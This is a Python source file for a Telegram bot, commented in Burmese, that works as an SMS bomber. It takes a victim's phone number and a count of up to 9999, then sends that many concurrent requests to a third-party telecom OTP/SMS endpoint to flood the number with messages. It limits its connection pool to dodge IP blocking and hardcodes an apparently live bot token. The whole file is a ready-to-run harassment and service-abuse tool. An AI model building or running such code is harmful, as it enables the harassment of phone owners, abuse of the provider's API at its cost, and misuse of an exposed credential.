import asyncio
import aiohttp
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Telegram Bot Token
TOKEN = "8702294693:AAGF_mmGKAg7-mWBuAl34jevVtDJ0mZE8HU"

# Conversation States
AGE_CHECK, PHONE_INPUT, AMOUNT_INPUT = range(3)

# Single Request Function (၁ ကြိမ် ပို့ခြင်း)
async def send_single_sms(session, normalized_phone):
    url = "https://api.maharprod.com/sms/v1/movie/telenor/atom_sms"
    try:
        async with session.post(url, json={"phoneNumber": normalized_phone}, timeout=10) as r:
            return r.status == 200
    except Exception:
        return False

# SMS Bulk Send Function (User သတ်မှတ်လိုက်တဲ့ အကြိမ်ရေအတိုင်း တစ်ပြိုင်နက် ပို့ခြင်း)
async def send_bulk_sms(normalized_phone, amount):
    # Timeout နှင့် IP Block သက်သာစေရန် Connection Pool Limit သတ်မှတ်ခြင်း
    conn = aiohttp.TCPConnector(limit=100) 
    async with aiohttp.ClientSession(connector=conn) as session:
        # User ပေးလိုက်တဲ့ amount အကြိမ်ရေအလိုက် Task များ ဖန်တီးခြင်း
        tasks = [send_single_sms(session, normalized_phone) for _ in range(amount)]
        
        # အကုန်လုံးကို တစ်ပြိုင်နက် (Concurrent) ခေါ်လိုက်ပါပြီ
        results = await asyncio.gather(*tasks)
        
        # အောင်မြင်တဲ့ အရေအတွက်ကို ရေတွက်ခြင်း
        success_count = sum(1 for r in results if r)
        return success_count

# 1. Bot Command /start (အသက်စစ်ဆေးခြင်း)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_keyboard = [['ဟုတ်ကဲ့၊ ၁၈ နှစ် ပြည့်ပါပြီ', 'မပြည့်သေးပါ']]
    
    await update.message.reply_text(
        "⚠️ သတိပေးချက်- ဤ Bot ကို အသုံးပြုရန် အသက် ၁၈ နှစ် ပြည့်ပြီးသူ ဖြစ်ရပါမည်။\n"
        "သင်သည် အသက် ၁၈ နှစ် ပြည့်ပြီးပြီလားခင်ဗျာ။",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    )
    return AGE_CHECK

# 2. Age Verification (အောင်မြင်လျှင် ဖုန်းနံပါတ်တောင်းခြင်း)
async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_answer = update.message.text
    
    if user_answer == 'ဟုတ်ကဲ့၊ ၁၈ နှစ် ပြည့်ပါပြီ':
        await update.message.reply_text(
            "📱 အတည်ပြုချက် အောင်မြင်ပါသည်။ SMS ပို့မည့် ဖုန်းနံပါတ်ကို ရိုက်ထည့်ပေးပါ-",
            reply_markup=ReplyKeyboardRemove()
        )
        return PHONE_INPUT
    else:
        await update.message.reply_text(
            "❌ စိတ်မရှိပါနဲ့ခင်ဗျာ၊ ဤ Bot သည် အသက် ၁၈ နှစ်မပြည့်သေးသူများ အသုံးပြုရန် မသင့်တော်ပါ။",
            reply_markup=ReplyKeyboardRemove()
        )
        return ConversationHandler.END

# 3. Phone Input (ဖုန်းနံပါတ်ရလျှင် အကြိမ်ရေတောင်းခြင်း)
async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text
    # ဖုန်းနံပါတ်ကို ခေတ္တ သိမ်းဆည်းထားခြင်း
    context.user_data['phone'] = phone_number 
    
    await update.message.reply_text(
        "🔢 ဘယ်နှစ်ကြိမ် (ဘယ်လောက်အကြိမ်ရေ) ပို့မှာလဲခင်ဗျာ?\n"
        "(ဥပမာ- 100 သို့မဟုတ် 9999 စသဖြင့် ဂဏန်းသီးသန့် ရိုက်ထည့်ပေးပါ)"
    )
    return AMOUNT_INPUT

# 4. Amount Input & SMS Execution (အကြိမ်ရေရလျှင် စတင်ပို့ဆောင်ခြင်း)
async def process_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount_text = update.message.text
    
    # ဂဏန်းဟုတ်မဟုတ် စစ်ဆေးခြင်း
    if not amount_text.isdigit():
        await update.message.reply_text("❌ ကျေးဇူးပြု၍ ဂဏန်းစစ်စစ် (ဥပမာ - 500) သာ ရိုက်ထည့်ပေးပါရန်။")
        return AMOUNT_INPUT
        
    amount = int(amount_text)
    
    # ပမာဏ ကန့်သတ်ချက် ထားလိုက ထားနိုင်ရန် (ဥပမာ- အများဆုံး ၉၉၉၉ ထက်မကျော်စေရန်)
    if amount <= 0 or amount > 9999:
        await update.message.reply_text("⚠️ အကြိမ်ရေသည် ၁ ကြိမ် မှ ၉၉၉၉ ကြိမ် အတွင်းသာ ဖြစ်ရပါမည်။ ပြန်ရိုက်ပေးပါ။")
        return AMOUNT_INPUT

    normalized_phone = context.user_data['phone']
    
    await update.message.reply_text(f"🚀 SMS {amount} ကြိမ် ပို့ခြင်း လုပ်ငန်းစဉ်ကို စတင်နေပါပြီ... ခေတ္တစောင့်ဆိုင်းပေးပါ။")
    
    # ပို့မည့် Function ကို ခေါ်ယူခြင်း
    success_total = await send_bulk_sms(normalized_phone, amount)
    
    await update.message.reply_text(
        f"✅ လုပ်ငန်းစဉ် ပြီးဆုံးပါပြီ။\n"
        f"📊 တောင်းဆိုထားသည့်အကြိမ်ရေ - {amount} ကြိမ်\n"
        f"🎉 အောင်မြင်စွာ ပို့ဆောင်ပြီးစီးမှု - {success_total} ကြိမ်"
    )
    return ConversationHandler.END

# Cancel Function
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("လုပ်ငန်းစဉ်ကို ဖျက်သိမ်းလိုက်ပါပြီ။", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main():
    application = Application.builder().token(TOKEN).build()

    # Conversation Handler Setup (အဆင့်ဆင့် စစ်ဆေးမည့် Flow)
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            AGE_CHECK: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_age)],
            PHONE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_phone)],
            AMOUNT_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_amount)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    application.add_handler(conv_handler)
    
    print("Bot စတင် အလုပ်လုပ်နေပါပြီ...")
    application.run_polling()

if __name__ == '__main__':
    main()
